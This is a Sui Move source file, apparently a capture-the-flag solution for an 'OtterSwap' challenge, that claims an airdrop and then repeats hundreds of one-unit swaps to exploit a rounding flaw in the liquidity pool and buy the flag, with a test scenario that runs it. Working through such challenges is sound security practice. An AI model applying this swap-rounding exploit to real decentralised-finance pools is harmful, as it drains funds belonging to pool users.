module solution::gringotts_solution {

    // [*] Import dependencies
    use sui::tx_context::{Self, TxContext};
    use sui::coin::{Self, Coin};
    // use sui::sui::SUI;
    // use std::vector;
    use sui::transfer;

    // use challenge::OtterLoan;
    use challenge::OtterSwap;
    use challenge::osec::{Self, OSEC};
    use challenge::router;
    use challenge::ctf::{Self, CTF, Airdrop};
    use challenge::merch_store;
    
    use std::debug;
    use std::string;
    
    #[test_only]
    use sui::test_scenario::{Self, next_tx, ctx};
    #[test_only]
    use std::bcs;

    // use challenge::coin_flip;

    fun pool_debug<CTF, OSEC>(liquidity_pool: &mut OtterSwap::Pool<CTF, OSEC>) {
        let mut debug_message = string::utf8(b"-----------------------------");
        debug::print(&debug_message);
        
        let (a, b) = OtterSwap::get_balance<CTF, OSEC>(liquidity_pool);
        let a_price = OtterSwap::get_a_price(liquidity_pool);
        let b_price = OtterSwap::get_b_price(liquidity_pool);

        debug_message = string::utf8(b"[CTF] = ");
        debug::print(&debug_message);
        debug::print(&a);
        debug::print(&a_price);
        
        debug_message = string::utf8(b"[OSEC] = ");
        debug::print(&debug_message);
        debug::print(&b);
        debug::print(&b_price);

        let k = a * b;
        debug_message = string::utf8(b"K = ");
        debug::print(&debug_message);
        debug::print(&k);

        debug_message = string::utf8(b"-----------------------------");
        debug::print(&debug_message);
    }

    fun debug_operation_name(operation_name : string::String) {
        debug::print(&operation_name);
    }

    #[allow(lint(self_transfer))]
    public fun solve<CoinTypeA, CoinTypeB>(
        liquidity_pool: &mut OtterSwap::Pool<CoinTypeA, CoinTypeB>,
        airdrop_shared: &mut Airdrop<CoinTypeA>,
        ctx: &mut TxContext
    ) {

        // RETRIEVE AIRDROP
        let mut coin_ctf = ctf::get_airdrop<CoinTypeA>(airdrop_shared, ctx);
        // transfer::public_transfer(coin_ctf, tx_context::sender(ctx));

        // DEBUG
        pool_debug(liquidity_pool);

        // step3: swap a -> b
        let mut counter = 1;
        let mut coin_osec = coin::zero<CoinTypeB>(ctx);
        while (counter < 250) {
            let mut coin_a = coin::split(&mut coin_ctf, 1, ctx);            
            let coin_out = OtterSwap::swap_a_b<CoinTypeA, CoinTypeB>(liquidity_pool, coin_a, ctx);
            coin::join(&mut coin_osec, coin_out);
            debug::print(&counter);
            counter = counter + 1;
        };

        // DEBUG
        pool_debug(liquidity_pool);

        // assert!( new_k <= k, 0 );

        let mut counter = 1;
        while (counter < 251) {

            let one_coin : Coin<CoinTypeB> = coin::split(&mut coin_osec, 1, ctx);
            let coin_out = OtterSwap::swap_b_a(liquidity_pool, one_coin, ctx);

            coin::join(&mut coin_ctf, coin_out);

            let param2 = string::utf8(b"CACA");
            debug::print(&param2);
            let one_coin = coin::split(&mut coin_ctf, 1, ctx);
            let remaining_amount = coin::value<CoinTypeA>(&coin_ctf);
            debug::print(&remaining_amount);
            let remaining_coins = coin::split(&mut coin_ctf, remaining_amount, ctx);
            let coin_osec1 = OtterSwap::swap_a_b<CoinTypeA, CoinTypeB>(liquidity_pool, one_coin, ctx);
            let coin_osec2 = OtterSwap::swap_a_b<CoinTypeA, CoinTypeB>(liquidity_pool, remaining_coins, ctx);
            coin::join(&mut coin_osec, coin_osec1);
            coin::join(&mut coin_osec, coin_osec2);
            debug::print(&counter);
            counter = counter + 1;
        };

        let ctf_total = coin::value<CoinTypeA>(&coin_ctf);
        debug::print(&ctf_total);

        let osec_total = coin::value<CoinTypeB>(&coin_osec);
        debug::print(&osec_total);

        merch_store::buy_flag(coin_osec, ctx);

        transfer::public_transfer(coin_ctf, tx_context::sender(ctx));
        // transfer::public_transfer(coin_osec, tx_context::sender(ctx));

        // DEBUG
        pool_debug(liquidity_pool);
    }

    #[test]
    public fun test_bug3() {
        let investor = @0x111;
        let swapper = @0x222;
        let contract = @admin;

        let mut scenario_val = test_scenario::begin(@admin);
        let scenario = &mut scenario_val;

        // step1: create pool
        debug_operation_name(string::utf8(b"            CREATE           "));
        next_tx(scenario, contract);
        {
            router::init_for_testing(test_scenario::ctx(scenario));
            ctf::init_for_testing(test_scenario::ctx(scenario));
            osec::init_for_testing(test_scenario::ctx(scenario));
        };

        // step2: add liquidity
        debug_operation_name(string::utf8(b"           ADD LIQ           "));
        next_tx(scenario, contract);
        {
            let mut liquidity_pool = test_scenario::take_shared<OtterSwap::Pool<CTF, OSEC>>(scenario);
            let coin_ctf = test_scenario::take_from_sender<Coin<CTF>>(scenario);
            let coin_osec = test_scenario::take_from_sender<Coin<OSEC>>(scenario);
            OtterSwap::initialize_pool(&mut liquidity_pool, coin_ctf, coin_osec, test_scenario::ctx(scenario));
            test_scenario::return_shared(liquidity_pool);
        };

        // DEBUG
        next_tx(scenario, swapper);
        {
            let mut liquidity_pool = test_scenario::take_shared<OtterSwap::Pool<CTF, OSEC>>(scenario);
            pool_debug(&mut liquidity_pool);
            test_scenario::return_shared(liquidity_pool);
        };

        // step2.5: redeem airdrop
        debug_operation_name(string::utf8(b"         CALL SOLVE         "));
        next_tx(scenario, swapper);
        {
            let param1 = string::utf8(b"REDEEMING AIRDROP");
            let param2 = string::utf8(b"DONE REDEEMING AIRDROP");
            debug::print(&param1);
            let mut airdrop_shared = test_scenario::take_shared<ctf::Airdrop<CTF>>(scenario);
            let mut liquidity_pool = test_scenario::take_shared<OtterSwap::Pool<CTF, OSEC>>(scenario);
            solve(&mut liquidity_pool, &mut airdrop_shared, test_scenario::ctx(scenario));
            debug::print(&param2);
            test_scenario::return_shared(airdrop_shared);
            test_scenario::return_shared(liquidity_pool);
        };

        test_scenario::end(scenario_val);

    }

}